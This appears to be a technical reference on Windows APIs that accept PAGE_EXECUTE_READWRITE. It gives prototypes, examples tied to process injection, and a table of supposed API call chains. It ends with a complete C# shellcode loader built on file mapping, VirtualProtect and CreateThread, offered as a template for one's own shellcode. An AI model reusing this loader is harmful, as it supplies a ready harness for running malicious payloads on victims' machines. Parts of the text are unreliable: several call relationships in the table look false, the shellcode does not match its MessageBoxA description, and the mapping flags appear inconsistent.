
The `PAGE_EXECUTE_READWRITE` flag is used in Windows to set a memory page's protection attributes to allow reading, writing, and executing code. Several Win32 APIs use this flag as an argument when allocating or changing memory pages. Here's a list of some of the key Win32 APIs that can take `PAGE_EXECUTE_READWRITE` as an argument:

### 1. **VirtualAlloc**
   - **Description**: Reserves or commits a region of pages in the virtual address space of the calling process. The pages are initialized to zero.
   - **Usage**: `VirtualAlloc` can be used to allocate memory with specific protection attributes, including `PAGE_EXECUTE_READWRITE`.
   - **Prototype**:
     ```c
     LPVOID VirtualAlloc(
         LPVOID lpAddress,
         SIZE_T dwSize,
         DWORD flAllocationType,
         DWORD flProtect
     );
     ```
   - **Example**:
     ```c
     LPVOID address = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     ```

### 2. **VirtualAllocEx**
   - **Description**: Reserves or commits a region of memory within the virtual address space of a specified process.
   - **Usage**: Often used in scenarios involving process injection.
   - **Prototype**:
     ```c
     LPVOID VirtualAllocEx(
         HANDLE hProcess,
         LPVOID lpAddress,
         SIZE_T dwSize,
         DWORD flAllocationType,
         DWORD flProtect
     );
     ```
   - **Example**:
     ```c
     LPVOID address = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     ```

### 3. **VirtualProtect**
   - **Description**: Changes the protection on a region of committed pages in the virtual address space of the calling process.
   - **Usage**: Can be used to modify the protection attributes of a memory region, such as making it executable.
   - **Prototype**:
     ```c
     BOOL VirtualProtect(
         LPVOID lpAddress,
         SIZE_T dwSize,
         DWORD flNewProtect,
         PDWORD lpflOldProtect
     );
     ```
   - **Example**:
     ```c
     DWORD oldProtect;
     BOOL result = VirtualProtect(address, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);
     ```

### 4. **VirtualProtectEx**
   - **Description**: Changes the protection on a region of committed pages in the virtual address space of a specified process.
   - **Usage**: Similar to `VirtualProtect` but operates on a different process.
   - **Prototype**:
     ```c
     BOOL VirtualProtectEx(
         HANDLE hProcess,
         LPVOID lpAddress,
         SIZE_T dwSize,
         DWORD flNewProtect,
         PDWORD lpflOldProtect
     );
     ```
   - **Example**:
     ```c
     DWORD oldProtect;
     BOOL result = VirtualProtectEx(hProcess, address, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);
     ```

### 5. **NtAllocateVirtualMemory**
   - **Description**: An internal NT API used to allocate memory in the virtual address space of a process.
   - **Usage**: Can be used for more granular control over memory management.
   - **Prototype**:
     ```c
     NTSTATUS NtAllocateVirtualMemory(
         HANDLE ProcessHandle,
         PVOID *BaseAddress,
         ULONG_PTR ZeroBits,
         PSIZE_T RegionSize,
         ULONG AllocationType,
         ULONG Protect
     );
     ```
   - **Example**:
     ```c
     NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     ```

### 6. **NtProtectVirtualMemory**
   - **Description**: An internal NT API used to change the protection on a region of memory in the virtual address space of a process.
   - **Usage**: Similar to `VirtualProtect`, but with lower-level access.
   - **Prototype**:
     ```c
     NTSTATUS NtProtectVirtualMemory(
         HANDLE ProcessHandle,
         PVOID *BaseAddress,
         PSIZE_T NumberOfBytesToProtect,
         ULONG NewAccessProtection,
         PULONG OldAccessProtection
     );
     ```
   - **Example**:
     ```c
     ULONG oldProtect;
     NTSTATUS status = NtProtectVirtualMemory(hProcess, &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
     ```

### 7. **MapViewOfFile**
   - **Description**: Maps a view of a file into the address space of the calling process.
   - **Usage**: Can be used to map executable code into a process.
   - **Prototype**:
     ```c
     LPVOID MapViewOfFile(
         HANDLE hFileMappingObject,
         DWORD dwDesiredAccess,
         DWORD dwFileOffsetHigh,
         DWORD dwFileOffsetLow,
         SIZE_T dwNumberOfBytesToMap
     );
     ```
   - **Example**:
     ```c
     LPVOID mapView = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, 0);
     ```

### 8. **CreateFileMapping**
   - **Description**: Creates or opens a named or unnamed file mapping object for a specified file.
   - **Usage**: Used to create a file mapping object, which can be used in conjunction with `MapViewOfFile`.
   - **Prototype**:
     ```c
     HANDLE CreateFileMapping(
         HANDLE hFile,
         LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
         DWORD flProtect,
         DWORD dwMaximumSizeHigh,
         DWORD dwMaximumSizeLow,
         LPCSTR lpName
     );
     ```
   - **Example**:
     ```c
     HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_EXECUTE_READWRITE, 0, fileSize, NULL);
     ```

### 9. **NtCreateSection**
   - **Description**: Creates a section object, which is used for mapping views of files into the address space of processes.
   - **Usage**: Typically used in more advanced or lower-level memory management scenarios.
   - **Prototype**:
     ```c
     NTSTATUS NtCreateSection(
         PHANDLE SectionHandle,
         ACCESS_MASK DesiredAccess,
         POBJECT_ATTRIBUTES ObjectAttributes,
         PLARGE_INTEGER MaximumSize,
         ULONG SectionPageProtection,
         ULONG AllocationAttributes,
         HANDLE FileHandle
     );
     ```
   - **Example**:
     ```c
     HANDLE sectionHandle;
     NTSTATUS status = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
     ```

### 10. **NtMapViewOfSection**
   - **Description**: Maps a view of a section into the address space of a process.
   - **Usage**: Used in conjunction with `NtCreateSection` to map sections of memory that can be executable.
   - **Prototype**:
     ```c
     NTSTATUS NtMapViewOfSection(
         HANDLE SectionHandle,
         HANDLE ProcessHandle,
         PVOID *BaseAddress,
         ULONG_PTR ZeroBits,
         SIZE_T CommitSize,
         PLARGE_INTEGER SectionOffset,
         PSIZE_T ViewSize,
         SECTION_INHERIT InheritDisposition,
         ULONG AllocationType,
         ULONG Win32Protect
     );
     ```
   - **Example**:
     ```c
     PVOID baseAddress = NULL;
     NTSTATUS status = NtMapViewOfSection(sectionHandle, hProcess, &baseAddress, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
     ```

### Summary

These APIs are critical in scenarios where direct memory manipulation is required, such as in process injection, custom memory allocation, and other advanced techniques. The `PAGE_EXECUTE_READWRITE` flag is particularly significant in contexts where memory needs to be writable and executable, which is often the case in dynamic code generation or exploitation scenarios.


Here's a table that outlines some common APIs that typically call the APIs listed above, including the calling function, its arguments, the called API, and its arguments.

| **Calling Function**     | **Arguments**                                                                                                                                                                         | **Called API**            | **Arguments**                                                               |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------- | --------------------------------------------------------------------------- |
| `CreateThread`           | `lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId`                                                                                           | `VirtualAlloc`            | `lpAddress, dwSize, flAllocationType, flProtect`                            |
| `CreateRemoteThread`     | `hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId`                                                                                 | `VirtualAllocEx`          | `hProcess, lpAddress, dwSize, flAllocationType, flProtect`                  |
| `NtCreateThreadEx`       | `ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags`                                                                                   | `NtAllocateVirtualMemory` | `ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect` |
| `RtlCreateUserThread`    | `ProcessHandle, SecurityDescriptor, CreateSuspended, StackZeroBits, StackReserve, StackCommit, StartAddress, StartParameter`                                                          | `NtAllocateVirtualMemory` | `ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect` |
| `LoadLibrary`            | `lpLibFileName`                                                                                                                                                                       | `VirtualAlloc`            | `lpAddress, dwSize, flAllocationType, flProtect`                            |
| `GetProcAddress`         | `hModule, lpProcName`                                                                                                                                                                 | `VirtualProtect`          | `lpAddress, dwSize, flNewProtect, lpflOldProtect`                           |
| `CreateFileMapping`      | `hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName`                                                                                              | `VirtualAlloc`            | `lpAddress, dwSize, flAllocationType, flProtect`                            |
| `MapViewOfFile`          | `hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap`                                                                                        | `VirtualProtect`          | `lpAddress, dwSize, flNewProtect, lpflOldProtect`                           |
| `CreateProcess`          | `lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation` | `NtAllocateVirtualMemory` | `ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect` |
| `NtMapViewOfSection`     | `SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect`                                          | `NtAllocateVirtualMemory` | `ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect` |
| `ZwCreateSection`        | `SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle`                                                                | `NtAllocateVirtualMemory` | `ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect` |
| `NtUnmapViewOfSection`   | `ProcessHandle, BaseAddress`                                                                                                                                                          | `NtAllocateVirtualMemory` | `ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect` |
| `ZwProtectVirtualMemory` | `ProcessHandle, BaseAddress, RegionSize, NewAccessProtection, OldAccessProtection`                                                                                                    | `VirtualProtect`          | `lpAddress, dwSize, flNewProtect, lpflOldProtect`                           |
| `RtlAllocateHeap`        | `HeapHandle, Flags, Size`                                                                                                                                                             | `VirtualAlloc`            | `lpAddress, dwSize, flAllocationType, flProtect`                            |
| `RtlFreeHeap`            | `HeapHandle, Flags, HeapBase`                                                                                                                                                         | `VirtualProtect`          | `lpAddress, dwSize, flNewProtect, lpflOldProtect`                           |

### Explanation:
- **Calling Function**: The higher-level API or routine that typically triggers the lower-level memory management or allocation APIs.
- **Arguments**: The typical arguments passed to these functions, which might include handles, sizes, flags, and addresses.
- **Called API**: The specific memory management API that is invoked by the higher-level function.
- **Arguments**: The typical arguments passed to the memory management API, often to allocate, protect, or map memory.

This table outlines the relationship between higher-level APIs (often used in application code) and lower-level memory management APIs (like those that handle virtual memory or process manipulation).


## MapViewofFile

Executing shellcode using `MapViewOfFile` combined with `VirtualProtect` is an advanced technique that can be used for running code in a region of memory that has been marked as executable. Here's a step-by-step explanation of how you can achieve this in C#, followed by a complete example.

### Overview of the Process

1. **Create a Memory-Mapped File:**
   - Use `CreateFileMapping` to create a memory-mapped file, which will allocate a region of memory.

2. **Map the View of the File:**
   - Use `MapViewOfFile` to map the memory-mapped file into the address space of the calling process.

3. **Copy the Shellcode:**
   - Copy your shellcode into the memory-mapped region.

4. **Change Memory Permissions:**
   - Use `VirtualProtect` to change the memory permissions of the region to be executable.

5. **Execute the Shellcode:**
   - Finally, execute the shellcode by creating a delegate and invoking it.

### Complete C# Example

Here’s how you can implement this process in C#:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32.SafeHandles;

class Program
{
    // Import necessary Windows API functions
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileMapping(
        IntPtr hFile,
        IntPtr lpFileMappingAttributes,
        uint flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        uint dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        UIntPtr dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        UIntPtr dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    // Constants for memory protection
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READWRITE = 0x04;
    const uint FILE_MAP_WRITE = 0x0002;
    const uint FILE_MAP_READ = 0x0004;
    const uint FILE_MAP_EXECUTE = 0x0020;
    const uint WAIT_OBJECT_0 = 0x00000000;
    const uint INFINITE = 0xFFFFFFFF;

    static void Main(string[] args)
    {
        // Shellcode (example is a simple MessageBoxA payload)
        byte[] shellcode = new byte[] {
            0x6a, 0x00, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54,
            0x53, 0xB8, 0xC7, 0x93, 0xBF, 0x77, 0xFF, 0xD0
        };

        // Create a file mapping
        IntPtr hFileMapping = CreateFileMapping(
            new IntPtr(-1),
            IntPtr.Zero,
            PAGE_READWRITE,
            0,
            (uint)shellcode.Length,
            null);

        if (hFileMapping == IntPtr.Zero)
        {
            Console.WriteLine("CreateFileMapping failed.");
            return;
        }

        // Map the view of the file
        IntPtr lpBaseAddress = MapViewOfFile(
            hFileMapping,
            FILE_MAP_WRITE | FILE_MAP_READ | FILE_MAP_EXECUTE,
            0,
            0,
            (UIntPtr)shellcode.Length);

        if (lpBaseAddress == IntPtr.Zero)
        {
            Console.WriteLine("MapViewOfFile failed.");
            return;
        }

        // Copy the shellcode to the mapped memory
        Marshal.Copy(shellcode, 0, lpBaseAddress, shellcode.Length);

        // Change the protection of the mapped memory to execute
        uint oldProtect;
        if (!VirtualProtect(lpBaseAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
        {
            Console.WriteLine("VirtualProtect failed.");
            UnmapViewOfFile(lpBaseAddress);
            return;
        }

        // Create a thread to execute the shellcode
        IntPtr hThread = CreateThread(
            IntPtr.Zero,
            UIntPtr.Zero,
            lpBaseAddress,
            IntPtr.Zero,
            0,
            out uint threadId);

        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("CreateThread failed.");
            UnmapViewOfFile(lpBaseAddress);
            return;
        }

        // Wait for the thread to finish execution
        WaitForSingleObject(hThread, INFINITE);

        // Cleanup
        UnmapViewOfFile(lpBaseAddress);
        Console.WriteLine("Shellcode executed successfully.");
    }
}
```

### Explanation

1. **CreateFileMapping:**
   - Creates a memory-mapped file. In this case, it uses `INVALID_HANDLE_VALUE` (`new IntPtr(-1)`) to create a mapping of the system paging file, effectively allocating memory.

2. **MapViewOfFile:**
   - Maps the memory into the process's address space. The `FILE_MAP_WRITE`, `FILE_MAP_READ`, and `FILE_MAP_EXECUTE` flags allow the mapped memory to be written to, read from, and executed.

3. **Copy Shellcode:**
   - The shellcode is copied into the memory that has been allocated and mapped.

4. **VirtualProtect:**
   - Changes the protection of the memory region to `PAGE_EXECUTE_READWRITE`, allowing the shellcode to be executed.

5. **CreateThread:**
   - Creates a new thread that begins execution at the start of the shellcode.

6. **WaitForSingleObject:**
   - Waits indefinitely for the created thread to finish executing.

7. **UnmapViewOfFile:**
   - Unmaps the view of the file and cleans up.

### Important Considerations

- **Shellcode:** The example uses a simple shellcode that executes a MessageBoxA function. You would replace this with your actual shellcode.
  
- **Security:** Executing arbitrary shellcode in this manner can be extremely dangerous and is often flagged by antivirus software. It should only be done in controlled environments with explicit permission.

- **Permissions:** This code requires sufficient privileges to allocate executable memory and create threads.

- **Anti-Virus Evasion:** This technique is generally well-known and may still be detected by modern antivirus and endpoint protection tools.
